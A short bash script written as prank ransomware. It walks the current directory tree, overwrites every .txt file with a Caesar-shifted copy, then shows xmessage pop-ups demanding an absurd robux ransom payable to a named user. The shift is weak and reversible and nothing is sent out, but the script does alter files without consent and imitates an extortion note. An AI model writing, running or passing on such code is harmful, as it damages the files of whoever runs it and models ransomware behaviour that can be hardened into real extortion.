#!/bin/bash

SEARCH_DIR="."
FILE_EXT="*.txt"
SHIFT_SET="D-ZA-Cd-za-c"

echo "Encrypting .txt files in $SEARCH_DIR..."

find "$SEARCH_DIR" -type f -name "$FILE_EXT" -print0 | while IFS= read -r -d '' file; do
    echo "Processing: $file"
    
    if tr 'A-Za-z' "$SHIFT_SET" < "$file" > "$file.tmp"; then
        mv "$file.tmp" "$file"
    else
        echo "Error processing $file"
        rm -f "$file.tmp"
    fi
done

choice=$(xmessage -title "YOU'VE GOT MAIL" -buttons "Fine you can take my bobux :1, I'm broke:( :2" -print "Bro we like, scrambled all your files and stuff. 
You gotta pay us 100,000,000 robux now or your files are stuck like this...FOREVER!!!!!! ")
echo "You chose: $choice"
if [[ "$choice" == *"I'm broke:("* ]]; then
    xmessage -title "Womp Womp" "ok your files are scrambled eggs now noob"
else
    xmessage -title "Great! Thx for ur generous donation XD" "Please forward the robux to memeMONARCH on http://theuselessweb.com and you will recive the key shortly."
fi
